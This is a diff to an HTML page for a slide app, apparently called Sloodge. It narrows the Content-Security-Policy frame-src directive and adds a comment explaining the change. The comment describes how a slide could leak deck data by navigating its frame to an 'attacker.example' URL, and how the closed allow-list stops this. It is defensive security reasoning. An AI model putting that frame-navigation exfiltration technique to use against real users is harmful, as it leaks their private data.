@@ -5,8 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; frame-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'none'"
+      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; frame-src blob: slide:; object-src 'none'; base-uri 'none'; form-action 'none'"
     />
+    <!--
+      `frame-src` is doing two jobs, and the second one is easy to miss.
+
+      The obvious one: it is what lets the app embed a slide at all, and the one CSP decision
+      `slide://` delivery does not escape, since it governs the *embedder's* choice of what may be
+      framed. It grants the slide nothing — the framed document's own policy is the header main
+      sends plus the meta `wrapSlideHtml` injects. `blob:` stays listed because a plain-browser host
+      (the evidence recorder, happy-dom) has no main process and falls back to that transport.
+
+      The load-bearing one: **`frame-src` governs every navigation of a child frame, not just its
+      initial `src`.** That makes this list the thing that stops a running slide from navigating
+      itself to `https://attacker.example/?d=<deck>` — an exfiltration channel that `connect-src
+      'none'` does not cover, because no CSP directive on the *slide* governs a frame navigating
+      itself (`navigate-to` was never shipped in Chromium) and the sandbox only withholds navigation
+      of the top frame. Measured in the real app: the attempt is refused with "Framing
+      'http://…' violates the following Content Security Policy directive: frame-src …", with no
+      request made. So this is a **closed allow-list** and must stay one — a unit test asserts no
+      `*`, no `http(s):`, and `slide:` in this directive and no other.
+
+      `'self'` was dropped from it in M2.0: the app frames slides and nothing else, and leaving it
+      would have let a slide navigate its frame to the app's own document.
+
+      Everything else stays as tight as it was; note in particular that `script-src 'self'` is
+      exactly the directive that used to block a slide's inline script through blob inheritance.
+    -->
     <title>Sloodge</title>
   </head>
   <body>
